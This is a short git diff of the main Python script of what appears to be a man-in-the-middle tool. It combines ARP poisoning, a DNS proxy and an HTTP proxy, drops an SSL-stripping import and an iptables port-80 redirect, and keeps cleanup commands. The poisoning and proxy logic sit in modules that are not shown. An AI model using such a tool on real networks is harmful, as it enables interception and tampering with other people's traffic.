@@ -12,10 +12,8 @@ import argparse
 from scapy.all import *
 from ArpPoisoner import ArpPoisoner
 from DnsProxy import DnsProxy
+from Proxy import Proxy
 
-
-
-from Proxy import Proxy, SSLStripRequestHandler
 BLUE = '\033[94m'
 END = '\033[0m'
 
@@ -81,20 +79,19 @@ if __name__ == "__main__":
 	swrt = SWRT()
 	if (swrt.args.conf != None):
 		config = DNSConf.DNSConf(swrt.args.interface, swrt.args.conf)		
+	
+	proxy = Proxy(swrt.args, config)
+	dnsproxy = DnsProxy(config, swrt.args)
 	try:
 		ArpPoisoner(swrt.args)
-		dnsproxy = DnsProxy(config, swrt.args)
-		dnsproxy.start()
-		os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports {}".format(8080))
+		dnsproxy.go()
+		proxy.go()
 		
-		Proxy(HandlerClass=HTTPrequest)
-
-
 	except KeyboardInterrupt:
 		print("QUIT")
 		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 		os.system('iptables -t nat -F')
-		exit(0)
+		exit(1)
 	except Exception as e:
 		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 		os.system('iptables -t nat -F')
